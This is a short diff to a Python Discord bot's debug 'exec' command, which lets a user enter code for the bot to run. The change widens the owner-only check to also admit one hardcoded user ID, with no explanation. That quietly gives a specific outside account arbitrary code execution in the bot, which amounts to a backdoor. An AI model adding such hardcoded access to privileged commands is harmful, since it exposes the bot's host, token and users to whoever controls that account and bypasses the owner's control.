@@ -183,7 +183,7 @@ class DebugCommands(Scale):
         description="Run some test code"
     )
     async def exec(self, ctx: InteractionContext):
-        if ctx.author == self.bot.owner:
+        if ctx.author == self.bot.owner or ctx.author.id == 324352543612469258:
             modal = Modal(
                 title="Please enter some code to test",
                 components=[
